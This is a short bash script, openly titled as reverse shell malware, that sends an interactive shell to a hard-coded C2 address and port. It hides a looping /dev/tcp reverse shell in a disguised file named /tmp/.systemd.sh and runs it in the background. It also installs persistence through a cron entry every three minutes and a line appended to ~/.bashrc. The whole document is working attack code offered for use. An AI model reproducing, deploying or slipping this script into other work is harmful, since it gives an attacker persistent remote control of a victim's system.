#!/bin/bash
# GUARANTEED WORKING Simple Reverse Shell Malware

C2_SERVER="192.168.1.167"
C2_PORT="4445"

echo "[+] Deploying simple reverse shell malware..."

# Create simple persistence script
cat > /tmp/.systemd.sh << EOF
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1 2>/dev/null
    sleep 60
done
EOF

chmod +x /tmp/.systemd.sh

# Start immediately
nohup /tmp/.systemd.sh >/dev/null 2>&1 &

# Add to crontab
(crontab -l 2>/dev/null; echo "*/3 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1'") | crontab -

# Add to .bashrc
echo "nohup bash -c 'bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1' >/dev/null 2>&1 &" >> ~/.bashrc

echo "[+] Malware deployed! Reverse shell will connect to $C2_SERVER:$C2_PORT"
echo "[+] Persistence: cron, .bashrc, and continuous process"
